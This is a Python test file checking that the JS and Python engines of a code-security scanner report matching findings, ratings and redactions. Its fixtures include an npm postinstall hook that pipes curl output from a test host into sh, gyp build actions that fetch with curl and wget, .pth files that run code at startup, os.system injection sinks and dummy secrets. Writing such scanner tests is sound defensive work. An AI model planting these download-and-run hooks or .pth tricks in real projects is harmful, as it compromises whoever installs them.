"""Engine parity for the project-scan robustness and report-integrity fixes.

Same comparison as test_js_parity (the helpers are imported from there): both
CLIs scan the same tree and must report the same findings, metrics, ratings,
gate and exit code. These trees are the review's reproductions; where a fix
is about what a snippet shows (redaction), the snippets are compared too.
All content is inert: nothing is executed, hosts are TEST-NET (192.0.2.x) or
.invalid, credentials are dummies. Skipped where Node isn't installed.
"""

import collections
import contextlib
import json
import os
import subprocess
import tempfile
import unittest

from tests.architecture import test_js_parity as parity

SEED = "q8Zr2LmX0vB7nTg4Wk1pYc9Hs6Jd3Fe5DUMMYVALUE9"
PEM_BODY = "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun"


@contextlib.contextmanager
def tree(files):
    """A temporary directory holding `files` (relative path -> str or bytes)."""
    with tempfile.TemporaryDirectory() as root:
        for rel, data in files.items():
            path = os.path.join(root, *rel.split("/"))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "wb") as f:
                f.write(data if isinstance(data, bytes) else data.encode("utf-8"))
        yield root


def snippets(report):
    """Every finding's key with its snippet (the Python-only ones left out)."""
    return collections.Counter(json.dumps([parity.issue_key(i), i["snipStart"], i["snippet"]])
                               for i in report["issues"] if not parity._python_only(i))


@unittest.skipUnless(parity.NODE, "node is not installed")
class CoreParityTests(unittest.TestCase):
    maxDiff = None
    assert_same = parity.EngineParityTests.assert_same

    def test_redaction_of_findings_built_outside_the_file_scan(self):
        files = {
            "settings.py": b"\xef\xbb\xbf# service settings\nSEED = \"" + SEED.encode() + b"\"\nDEBUG_LEVEL = 1\n",
            "u7.py": b"# -*- coding: utf-7 -*-\nSEED = \"" + SEED.encode() + b"\"\nx = 1\n",
            "keys.js": b"\xff\xfe" + ('const k = "-----BEGIN RSA PRIVATE KEY-----\n' + PEM_BODY + "\n" + PEM_BODY
                                      + '\n-----END RSA PRIVATE KEY-----";\n').encode("utf-16-le"),
            "app.py": ("import os\nfrom flask import request\n\n\ndef run(cmd):\n    os.system(cmd)\n\n\n"
                       "def view():\n    seed = \"" + SEED + "\"\n    run(request.args.get(\"c\"))\n"),
        }
        with tree(files) as root:
            js, py = parity.both(root)
            self.assert_same(js, py, label="redaction")
            self.assertEqual(snippets(js[1]), snippets(py[1]))
            for engine, (_, report, _) in (("js", js), ("py", py)):
                self.assertNotIn(SEED, json.dumps(report), engine)
                self.assertNotIn(PEM_BODY, json.dumps(report), engine)
            self.assertIn("X-CMD", {i["rule"] for i in py[1]["issues"]})

    def test_gyp_includes_and_pyw_sources(self):
        files = {
            "binding.gyp": "{\n  'includes': ['build/common.gypi'],\n  'targets': [{'target_name': 'addon'}]\n}\n",
            "build/common.gypi": ("{\n  'target_defaults': {\n    'actions': [{\n      'action_name': 'marker',\n"
                                  "      'action': ['sh', '-c', 'curl http://192.0.2.1/marker.txt -o out.txt'],\n"
                                  "    }],\n  },\n}\n"),
            "tools/gen.gyp": "{'variables': {'x': '<!(curl -s http://192.0.2.1/v)'}}\n",
            "deps/UPPER.GYPI": "{'targets': [{'actions': [{'action': ['python', 'gen.py']}]}]}\n",
            "broken.gypi": "{'targets': [",
            "tool.pyw": "import os\nos.system(user_cmd)  # marker\n",
            "node_modules/native/binding.gyp": "{'targets': [{'actions': [{'action': ['node', 'x.js']}]}]}\n",
            "node_modules/native/common.gypi": "{'variables': {'y': '<!(wget http://192.0.2.1/y)'}}\n",
        }
        with tree(files) as root:
            for deps in (False, True):
                js, py = parity.both(root, deps=deps, extra=("--ci",))
                with self.subTest(deps=deps):
                    self.assert_same(js, py, label=f"gyp/pyw deps={deps}")
                    found = {(i["rule"], i["file"].replace("\\", "/")) for i in py[1]["issues"]}
                    self.assertIn(("SC-INSTALL-HOOK", "build/common.gypi"), found)
                    self.assertIn(("S-OSCMD-PY", "tool.pyw"), found)
                    self.assertEqual(deps, ("SC-INSTALL-HOOK", "node_modules/native/common.gypi") in found)
                    self.assertEqual((js[0], py[0]), (1, 1))


    def test_pth_lines_split_both_ways(self):
        seps = ["\v", "\f", "\x1c", "\x1d", "\x1e", "\x85", "\u2028", "\u2029"]
        files = {f"s{n}.pth": f'# path notes{sep}import sys; print("PTH-MARKER-{n}")\n' for n, sep in enumerate(seps)}
        files["mixed.pth"] = ("./lib\r\nx\x85import zlib; zlib.decompress(b)\n./a\u2028./b\n"
                              "import os\f./c\n# a\vimport a\x1cimport b\nimports\x1dimportlib\n")
        files["bom.pth"] = b"\xef\xbb\xbf# x\x0cimport os; exec(s)\r\n"
        with tree(files) as root:
            js, py = parity.both(root)
            self.assert_same(js, py, label="pth")
            self.assertEqual(snippets(js[1]), snippets(py[1]))
            self.assertEqual(len([i for i in py[1]["issues"] if i["rule"] == "SC-PTH-EXEC"]), len(seps) + 4)

    def test_surrogates_left_by_a_utf7_cookie(self):
        files = {"a.py": b'# -*- coding: utf-7 -*-\nx = "+2AA-"  # TODO marker\n',
                 "b.py": b"# coding: utf-7\n+2D3eAA- +3gA- +2D3YPQ- +2ADYAA-\nimport os\nos.system(c)\n"}
        with tree(files) as root:
            js, py = parity.both(root, extra=("--ci",))
            self.assert_same(js, py, label="surrogates")
            self.assertEqual(snippets(js[1]), snippets(py[1]))
            self.assertEqual((js[0], py[0]), (1, 1))
            (todo,) = [i for i in py[1]["issues"] if i["rule"] == "Q-TODO"]
            self.assertEqual(todo["snippet"][1], 'x = "\ufffd"  # TODO marker')

    def test_capped_findings_count_in_the_rating(self):
        table = "".join(f'value_{n:04d} = "' + f"segment-{n:04d} " * 14 + '"\n' for n in range(2000))
        catches = "try { f() } catch (e) {}\n" * 300 + "// TODO later\n" * 15
        for label, files in (("smells", {"table.py": table}), ("bugs", {"c.js": catches}),
                             ("both", {"table.py": table, "c.js": catches, "t.py": "# TODO x\n" * 260})):
            with self.subTest(tree=label), tree(files) as root:
                js, py = parity.both(root, extra=("--ci",))
                self.assert_same(js, py, label=f"cap rating {label}")
                capped = lambda r: sorted((i["file"], i["omitted"], i["omittedType"])
                                          for i in r["issues"] if i["rule"] == "Q-CAPPED")
                self.assertEqual(capped(js[1]), capped(py[1]))
                self.assertEqual(py[1]["ratings"]["maintainability"], {"smells": "E", "bugs": "A", "both": "E"}[label])

    def test_install_hook_lines(self):
        dependency = ('{\n  "name": "x",\n  "dependencies": {\n    "install": "^1.0.0"\n  },\n'
                      '  "scripts": {\n    "install": "node-gyp rebuild"\n  }\n}\n')
        tricky = ('{"description": "run \\"postinstall\\" first", "scripts": {"test": "x"},\n'
                  '"config": {"scripts": {"postinstall": "no"}},\n'
                  '"scripts": {\n"post\\u0069nstall": "curl http://192.0.2.1/x | sh",\n "prepare": "a",\n'
                  '"prepare": "husky install"}, "x": [{"install": 1}]}\n')
        files = {"package.json": dependency, "tricky/package.json": tricky,
                 "bom/package.json": b"\xef\xbb\xbf" + dependency.replace("\n", "\r\n").encode(),
                 "node_modules/dep/package.json": dependency, "index.js": "module.exports = 1;\n"}
        with tree(files) as root:
            for deps in (False, True):
                js, py = parity.both(root, deps=deps)
                with self.subTest(deps=deps):
                    self.assert_same(js, py, label=f"hook lines deps={deps}")
                    self.assertEqual(snippets(js[1]), snippets(py[1]))
                    lines = sorted((i["file"].replace("\\", "/"), i["line"]) for i in py[1]["issues"]
                                   if i["rule"] == "SC-INSTALL-HOOK")
                    want = [("bom/package.json", 7), ("package.json", 7), ("tricky/package.json", 4),
                            ("tricky/package.json", 6)] + ([("node_modules/dep/package.json", 7)] if deps else [])
                    self.assertEqual(lines, sorted(want))

    def test_report_path_collisions_exit_3_before_the_scan(self):
        with tree({"a.py": "import os\nos.system(cmd)\n"}) as root, tempfile.TemporaryDirectory() as out:
            cases = [("SARIF on the JSON default", ["--sarif", "lazaret-report.json"]),
                     ("JSON and HTML", ["--json", "X", "--html", os.path.join(out, "sub", "..", "X")]),
                     ("HTML and SARIF", ["--no-json", "--html", "r", "--sarif", "./r"])]
            for label, args in cases:
                with self.subTest(case=label):
                    runs = [subprocess.run(cmd + ["--out-dir", out, *args], capture_output=True, encoding="utf-8",
                                           errors="replace", timeout=parity.CLI_TIMEOUT)
                            for cmd in (parity.js_cmd(root), parity.py_cmd(root))]
                    self.assertEqual([r.returncode for r in runs], [3, 3], [r.stderr for r in runs])
                    for r in runs:
                        self.assertIn("reports would both be written to", r.stderr)
                        self.assertNotIn("Lazaret scan", r.stdout)
                    self.assertEqual(os.listdir(out), [])

if __name__ == "__main__":
    unittest.main()
